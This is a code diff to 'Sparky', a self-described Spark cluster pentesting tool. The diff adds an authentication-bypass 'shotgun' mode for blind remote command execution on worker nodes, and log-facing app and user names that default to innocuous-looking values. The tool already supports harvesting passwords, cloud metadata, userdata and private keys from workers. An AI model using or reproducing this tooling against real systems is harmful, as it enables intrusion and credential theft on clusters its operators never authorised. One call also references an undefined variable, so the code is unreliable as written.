@@ -1,10 +1,9 @@
 import argparse
-from utils.common import whine, confirmSparkMaster
 from utils.sparkClient import SparkClient
-from utils.general import parseListNodes
-from utils.cmd import parseCommandOutput
+from utils.general import parseListNodes, removeSpaces, whine
+from utils.cmd import parseCommandOutput, blindCommandExec
 import multiprocessing
-import sys, os
+import sys, os, signal, base64
 
 
 def isValidFile(parser, arg):
@@ -14,13 +13,23 @@ def isValidFile(parser, arg):
         return open(arg, "r")  # return an open file handle
 
 
+def _request_stop(signum, _):
+    whine("Shutting down Spark driver", "warn")
+    raise SystemExit()
+
+
 def main(results):
-    target = results.spark_master
-    port = int(results.spark_port)
+    hostPort = results.spark_master.split(":")
+    localIP = results.driver_ip
+    appName = results.appName
+    username = results.username
+    target = hostPort[0]
+    port = 7077
+    if len(hostPort) > 1:
+        port = int(hostPort[1])
+
     p = multiprocessing.Pool()
-    sparkSession = SparkClient(target, port)
-    whine("Initializing Spark...This can take a little while", "info")
-    sparkSession.initContext()
+    sClient = SparkClient(target, port, localIP, appName, username)
     print("")
     whine(
         "Testing target to confirm a spark master is running on {0}:{1}".format(
@@ -28,15 +37,36 @@ def main(results):
         ),
         "info",
     )
-    if not confirmSparkMaster(sparkSession):
+    sparkConfirmed = sClient.sendHello()
+    if not sparkConfirmed:
         whine("Could not confirm the target is running spark", "warn")
+    elif sparkConfirmed and sClient.requiresAuthentication:
+        whine(
+            "Spark master confirmed at {0}:{1} - authentication required".format(
+                target, port
+            ),
+            "warn",
+        )
+    else:
+        whine("Spark master confirmed at {0}:{1}".format(target, port), "good")
 
-    if sparkSession.getVersion():
-        msg = "Spark is running version {0}"
-        whine(msg.format(sparkSession.version), "good")
+    whine("Initializing local Spark driver...This can take a little while", "info")
+    if sClient.requiresAuthentication and not (results.secret or results.shotgun):
+        whine(
+            "Spark is protected with authentication. Either provide a secret (-S) or add --shotgun option when executing a command to bypass authentication",
+            "err",
+        )
+        sys.exit(-1)
+
+    if results.shotgun:
+        whine("Performing blind command execution on workers", "info")
+        sClient.useShotgun = True
+    else:
+        sClient.initContext(authentication, results.secret)
+        print("")
 
     if results.listNodes:
-        parseListNodes(sparkSession)
+        parseListNodes(sClient)
 
     if results.listFiles:
         interpreterArgs = [
@@ -46,44 +76,58 @@ def main(results):
                 results.extension
             ),
         ]
-        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)
+        parseCommandOutput(sClient, interpreterArgs, results.numWokers)
 
     if results.passwdInFile:
         scriptContent = open("./utils/searchPass.py", "r").read()
         interpreterArgs = ["python", "-c", scriptContent, results.extension]
-        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)
+        parseCommandOutput(sClient, interpreterArgs, results.numWokers)
 
     if results.cmd:
-        interpreterArgs = [results.cmd]
-        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)
+        if sClient.useShotgun:
+            blindCommandExec(sClient, base64.b64encode(results.cmd))
+        else:
+            interpreterArgs = [results.cmd]
+            parseCommandOutput(sClient, interpreterArgs, results.numWokers)
 
     if results.script:
         scriptContent = results.script.read()
-        interpreterArgs = ["/bin/bash", "-c", scriptContent]
-        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)
+        if sClient.useShotgun:
+            blindCommandExec(sClient, base64.b64encode(scriptContent))
+        else:
+            interpreterArgs = ["/bin/bash", "-c", scriptContent]
+            parseCommandOutput(sClient, interpreterArgs, results.numWokers)
 
     if results.metadata:
         scriptContent = open("./utils/cloud.py", "r").read()
         interpreterArgs = ["python", "-c", scriptContent, "metadata"]
-        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)
+        parseCommandOutput(sClient, interpreterArgs, results.numWokers)
 
     if results.userdata:
         scriptContent = open("./utils/cloud.py", "r").read()
         interpreterArgs = ["python", "-c", scriptContent, "userdata"]
-        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)
+        parseCommandOutput(sClient, interpreterArgs, results.numWokers)
 
     if results.privatekey:
         scriptContent = open("./utils/cloud.py", "r").read()
         interpreterArgs = ["python", "-c", scriptContent, "privatekey"]
-        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)
+        parseCommandOutput(sClient, interpreterArgs, results.numWokers)
 
 
 if __name__ == "__main__":
+    signal.signal(signal.SIGINT, _request_stop)
+    signal.signal(signal.SIGTERM, _request_stop)
+
     parser = argparse.ArgumentParser(
         description="Sparky: a tool to pentest Spark clusters"
     )
-    parser.add_argument("spark_master", help="The master node of a Spark cluster")
-    parser.add_argument("spark_port", help="Spark port (usually 7077)", default=7077)
+    parser.add_argument(
+        "spark_master",
+        help="The master node of a Spark cluster host:port. If no port is provided, default to 7077",
+    )
+    parser.add_argument(
+        "driver_ip", help="Local IP to bind to for communicating with spark workers."
+    )
 
     group_general = parser.add_argument_group("General")
     group_cmd = parser.add_argument_group("Command execution")
@@ -97,6 +141,28 @@ if __name__ == "__main__":
         default=False,
         dest="listNodes",
     )
+    group_general.add_argument(
+        "-a",
+        "--appname",
+        help="Name of the app as it will appear in the spark logs",
+        default="ML exp",
+        dest="appName",
+    )
+    group_general.add_argument(
+        "-U",
+        "--username",
+        help="Name of the user as it will appear in the spark logs",
+        default="lambda",
+        dest="username",
+    )
+    group_general.add_argument(
+        "-S",
+        "--secret",
+        help="Secret to authenticate to Spark master",
+        default="",
+        dest="secret",
+    )
+
     group_general.add_argument(
         "-f",
         "--list-files",
@@ -112,11 +178,10 @@ if __name__ == "__main__":
         default="*",
         dest="extension",
     )
-
     group_general.add_argument(
         "-k",
         "--search",
-        help="Search for patterns in files submited to a worker. Default Patterns taken from patterns.txt",
+        help="Search for patterns in files submited to a worker. Default Patterns hardcoded in utils/searchPass.py",
         action="store_true",
         default=False,
         dest="passwdInFile",
@@ -124,6 +189,14 @@ if __name__ == "__main__":
 
     group_cmd.add_argument(
         "-c", "--cmd", help="Execute a command", default=False, dest="cmd"
+    )
+    group_cmd.add_argument(
+        "-g",
+        "--shotgun",
+        help="Bypass authentication and execute a command on a worker node",
+        action="store_true",
+        default=False,
+        dest="shotgun",
     )
     group_cmd.add_argument(
         "-s",
